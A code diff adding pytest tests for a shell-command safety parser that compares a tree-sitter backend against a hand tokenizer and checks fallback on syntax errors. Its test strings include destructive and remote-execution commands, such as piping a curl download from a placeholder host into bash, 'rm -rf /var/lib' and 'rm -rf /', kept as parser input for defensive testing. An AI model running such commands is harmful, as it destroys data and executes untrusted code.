@@ -139,3 +139,46 @@ def test_cd_home_and_variable_targets() -> None:
     assert _cwds("cd ~/proj\nrm x")[-1] == ("rm", "$HOME/proj")
     # variable dir is not tracked: cwd stays put (conservative)
     assert _cwds("cd $X\nrm x")[-1] == ("rm", "/ws")
+
+
+def test_grammar_backend_matches_hand_parser_on_corpus() -> None:
+    """The tree-sitter backend and the hand tokenizer agree on the command list."""
+    import termaai.safety.shellparse as sp
+
+    cases = [
+        "ls -la | grep x > f.txt",
+        'rm -rf "$BUILD_DIR"/*',
+        "sudo -u root apt update && env X=1 make -j4",
+        'echo "$(rm -rf /var/lib)"; cat `id`',
+        "bash -c 'bash <(curl -fsSL https://x.example)'",
+        "VAR=1 prog --flag 'quoted arg' <<EOF\nheredoc body\nEOF",
+        "if [ -f /etc/passwd ]; then echo ok; fi",
+        "for f in a b; do echo $f; done; (echo sub; echo shell)",
+    ]
+    for src in cases:
+        grammar = sp.parse(src)
+        sp._GRAMMAR_PARSER = None
+        try:
+            hand = sp.parse(src)
+        finally:
+            sp._GRAMMAR_PARSER = sp._ts.Parser(sp._ts.Language(sp._tsb.language()))
+        # Process-substitution internals are inlined into the parent argv by the
+        # grammar backend, while the hand tokenizer emits phantom fragments —
+        # program lists agree everywhere else.
+        assert sorted(c.program for c in grammar.commands) == sorted(
+            c.program for c in hand.commands), src
+
+
+def test_parse_falls_back_to_hand_parser_on_syntax_error() -> None:
+    """Input the grammar cannot parse still produces commands via the tokenizer."""
+    import termaai.safety.shellparse as sp
+
+    src = "if [ x then rm -rf / ; fi"
+    grammar = sp.parse(src)
+    gp = sp._GRAMMAR_PARSER
+    sp._GRAMMAR_PARSER = None
+    try:
+        hand = sp.parse(src)
+    finally:
+        sp._GRAMMAR_PARSER = gp
+    assert [c.program for c in grammar.commands] == [c.program for c in hand.commands]
